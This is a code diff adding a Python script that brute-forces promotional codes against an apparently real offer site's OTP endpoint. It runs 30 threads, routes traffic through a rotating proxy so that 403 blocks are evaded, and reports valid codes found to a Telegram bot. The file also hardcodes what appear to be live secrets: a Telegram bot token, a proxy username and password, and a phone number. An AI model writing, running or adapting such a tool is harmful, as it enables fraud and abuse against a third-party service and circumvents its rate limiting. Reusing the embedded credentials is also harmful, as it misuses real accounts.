@@ -1,0 +1,245 @@
+import requests
+import time
+import random
+import string
+import json
+import concurrent.futures
+import threading
+from threading import Lock
+from collections import defaultdict
+from datetime import datetime
+
+# ================== TELEGRAM CONFIGURATION ==================
+TELEGRAM_BOT_TOKEN = "8862593507:AAFYWO7Wp-TiIaVCtbuoE3yLAxkABt3x8uY"
+ADMIN_CHAT_ID = "6420941417"
+
+def send_telegram_message(message):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "HTML"}
+        requests.post(url, data=data, timeout=10)
+    except Exception as e:
+        print(f"Failed to send: {e}")
+
+# ================== CONFIGURATION ==================
+BASE_URL = "https://www.ossw.theofferclub.in?"
+OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
+TEST_MOBILE = "9764324143" 
+
+BATCH_SIZE = 300
+MAX_WORKERS = 30
+DELAY_PER_THREAD = 0.7
+
+# ================== PROXY CONFIGURATION ==================
+PROXY_USERNAME = "90e72099a501a28b2a-country-in"
+PROXY_PASSWORD = "5ebe4262-ac75-4335-b06b-f4224c35cfd5"
+PROXY_HOST = "rotating-dc.proxy.arealproxy.com"
+PROXY_PORT = "9000"
+
+PROXY_URL = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{PROXY_HOST}:{PROXY_PORT}"
+PROXIES = {
+    "http": PROXY_URL,
+    "https": PROXY_URL
+}
+
+print_lock = Lock()
+
+# Thread tracking
+thread_counter = defaultdict(int)
+thread_id_map = {}
+counter_lock = Lock()
+
+def get_thread_id():
+    thread = threading.current_thread()
+    with counter_lock:
+        if thread not in thread_id_map:
+            thread_id_map[thread] = len(thread_id_map) + 1
+        return thread_id_map[thread]
+
+def increment_counter():
+    thread = threading.current_thread()
+    with counter_lock:
+        thread_counter[thread] += 1
+        return thread_counter[thread]
+
+def generate_random_code() -> str:
+    prefix = "MGTQ"
+    
+    if random.choice([True, False]):
+        # Pattern A: MGTQ + 1 letter + 5 digits (Fixed position)
+        code = f"{prefix}{random.choice(string.ascii_uppercase)}{''.join(random.choices(string.digits, k=5))}"
+    else:
+        # Pattern B: 2 Letters aur 4 digits milkar 6 chars banayein, phir unhe mix (shuffle) karein
+        chars = random.choices(string.ascii_uppercase, k=2) + random.choices(string.digits, k=4)
+        random.shuffle(chars)
+        code = f"{prefix}{''.join(chars)}"
+    
+    return code
+
+def check_code(code: str, mobile: str = TEST_MOBILE) -> dict:
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Referer": "https://www.ossw.theofferclub.in/",
+        "Origin": "https://www.ossw.theofferclub.in",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+    
+    data = {"phone": mobile, "ccode": code}
+    
+    try:
+        # Using PROXY
+        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15, proxies=PROXIES)
+        
+        if response.status_code == 200:
+            try:
+                json_resp = response.json()
+                is_valid = json_resp.get("status") == "success"
+                return {
+                    "code": code,
+                    "status_code": response.status_code,
+                    "valid": is_valid
+                }
+            except:
+                is_valid = "success" in response.text.lower()
+                return {
+                    "code": code,
+                    "status_code": response.status_code,
+                    "valid": is_valid
+                }
+        else:
+            return {
+                "code": code,
+                "status_code": response.status_code,
+                "valid": False
+            }
+        
+    except Exception as e:
+        return {
+            "code": code,
+            "status_code": 0,
+            "valid": False
+        }
+
+def process_code(code: str):
+    tid = get_thread_id()
+    count = increment_counter()
+    result = check_code(code)
+    
+    with print_lock:
+        if result['valid']:
+            print(f"✅ VALID | T{tid}[{count}] | {result['code']} | {result['status_code']}")
+            with open("valid_codes.txt", "a") as f:
+                f.write(f"{result['code']} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        else:
+            print(f"❌ INVALID | T{tid}[{count}] | {result['code']} | {result['status_code']}")
+    
+    time.sleep(DELAY_PER_THREAD)
+    return result
+
+def send_batch_valid_codes(valid_codes, batch_num):
+    if not valid_codes:
+        return
+    
+    message = f"📦 <b>Batch #{batch_num} Complete!</b>\n\n"
+    message += f"✅ <b>Valid Codes Found:</b> {len(valid_codes)}\n\n"
+    for code in valid_codes:
+        message += f"🔑 <code>{code}</code>\n"
+    
+    send_telegram_message(message)
+    print(f"\n📤 Sent {len(valid_codes)} valid codes to Telegram\n")
+
+def run_batch(batch_num):
+    codes = [generate_random_code() for _ in range(BATCH_SIZE)]
+    batch_valid = []
+    batch_start = time.time()
+    
+    print(f"\n{'='*70}")
+    print(f"📦 BATCH #{batch_num} | Testing {BATCH_SIZE} codes | Using ROTATING PROXY")
+    print(f"{'='*70}\n")
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [executor.submit(process_code, code) for code in codes]
+        
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                result = future.result()
+                if result["valid"]:
+                    batch_valid.append(result["code"])
+            except Exception as e:
+                with print_lock:
+                    print(f"Thread error: {e}")
+    
+    batch_time = round(time.time() - batch_start, 2)
+    speed = round(BATCH_SIZE / batch_time, 1)
+    
+    print(f"\n{'='*70}")
+    print(f"📊 BATCH #{batch_num} COMPLETE")
+    print(f"   ✅ Valid codes: {len(batch_valid)}")
+    print(f"   ⏱️ Time: {batch_time}s | Speed: {speed} codes/sec")
+    print(f"{'='*70}")
+    
+    if batch_valid:
+        send_batch_valid_codes(batch_valid, batch_num)
+    else:
+        print(f"\n⏸️ Pausing 2 seconds before next batch...\n")
+    
+    time.sleep(2)
+    return batch_valid
+
+def test_proxy():
+    """Test if proxy is working before starting"""
+    print("🔍 Testing proxy connection...")
+    try:
+        test_response = requests.get("https://httpbin.org/ip", proxies=PROXIES, timeout=15)
+        if test_response.status_code == 200:
+            print(f"✅ Proxy working! IP: {test_response.json()['origin']}")
+            return True
+        else:
+            print(f"❌ Proxy test failed: Status {test_response.status_code}")
+            return False
+    except Exception as e:
+        print(f"❌ Proxy test failed: {e}")
+        return False
+
+def main():
+    print("="*70)
+    print("🚀 INFINITE CODE CHECKER with ROTATING PROXY")
+    print("="*70)
+    print(f"Batch Size: {BATCH_SIZE} | Threads: {MAX_WORKERS}")
+    print(f"Mobile: {TEST_MOBILE}")
+    print(f"Proxy: {PROXY_HOST}:{PROXY_PORT}")
+    print(f"Code Pattern: Mixed (Pattern A + Pattern B with shuffle)")
+    print("="*70)
+    
+    # Test proxy before starting
+    if not test_proxy():
+        print("\n⚠️ Proxy test failed! Check your credentials.")
+        response = input("Continue anyway? (y/n): ")
+        if response.lower() != 'y':
+            return
+    
+    print("\n✅ Bot started! Using rotating proxy (no sleep on 403)")
+    print("✅ Sending valid codes to Telegram after each batch")
+    print("="*70 + "\n")
+    
+    send_telegram_message("🤖 <b>Code Checker Bot Started!</b>\n\n✅ Running continuously\n✅ Using rotating proxy\n✅ No sleep on 403 (proxy handles it)\n✅ Using mixed code patterns\n✅ Will send valid codes after each batch")
+    
+    batch_num = 0
+    total_valid = 0
+    
+    try:
+        while True:
+            batch_num += 1
+            batch_valid = run_batch(batch_num)
+            total_valid += len(batch_valid)
+            
+            if batch_num % 5 == 0:
+                print(f"\n📊 TOTAL SO FAR: {total_valid} valid codes | {batch_num} batches completed\n")
+                
+    except KeyboardInterrupt:
+        print(f"\n\n🛑 Stopped by user")
+        print(f"📊 Final stats: {total_valid} valid codes from {batch_num} batches")
+        send_telegram_message(f"🛑 <b>Bot Stopped</b>\n\n📊 Final stats:\n✅ Valid codes: {total_valid}\n📦 Batches: {batch_num}")
+
+if __name__ == "__main__":
+    main()
